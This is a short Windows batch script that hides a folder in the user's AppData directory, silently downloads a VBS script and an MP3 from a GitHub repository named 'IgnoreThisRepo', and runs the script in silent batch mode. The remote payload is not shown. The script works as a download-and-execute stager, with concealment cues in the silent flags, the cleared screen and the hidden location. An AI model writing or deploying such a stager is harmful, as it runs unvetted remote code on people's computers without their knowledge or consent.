@echo off

set file="%appdata%/Hello/Hello.vbs"
cd %appdata%
if exist %file% (
    echo File exists!
    cls
    cd Hello
    cscript.exe "Hello.vbs" //B
) else (
    echo File does not exist!
    title Downloading...
    mkdir Hello
    cd Hello
    curl -s -o Hello.vbs https://raw.githubusercontent.com/o4six1/IgnoreThisRepo/main/Hello.vbs
    curl -s -o Hello.mp3 https://raw.githubusercontent.com/o4six1/IgnoreThisRepo/main/Hello.mp3
    cls
    cscript.exe "Hello.vbs" //B
)